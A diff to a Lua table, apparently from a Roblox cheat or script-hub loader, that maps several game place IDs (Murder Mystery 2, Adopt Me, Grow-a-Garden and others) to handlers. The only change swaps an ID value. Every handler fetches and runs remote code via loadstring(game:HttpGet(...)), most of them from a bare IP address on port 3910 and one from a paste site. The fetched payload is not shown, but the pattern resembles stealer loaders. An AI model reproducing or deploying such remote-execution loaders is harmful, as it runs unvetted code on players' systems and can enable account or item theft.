@@ -240,23 +240,23 @@ local handlers = {
         loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
     end},
     [142823291] = {name="Murder Mystery 2", action=function()
-        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        ID="e2249ae4-0580-4b0f-8289-87f460b363d6"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [920587237] = {name="Adopt Me", action=function()
-        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        ID="e2249ae4-0580-4b0f-8289-87f460b363d6"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [126884695634066] = {name="Grow-a-Garden", action=function()
-        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        ID="e2249ae4-0580-4b0f-8289-87f460b363d6"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [124977557560410] = {name="Grow-a-Garden [NEWBIES]", action=function()
-        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        ID="e2249ae4-0580-4b0f-8289-87f460b363d6"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [127742093697776] = {name="Plants VS Brainrot", action=function()
-        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        ID="e2249ae4-0580-4b0f-8289-87f460b363d6"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
 }
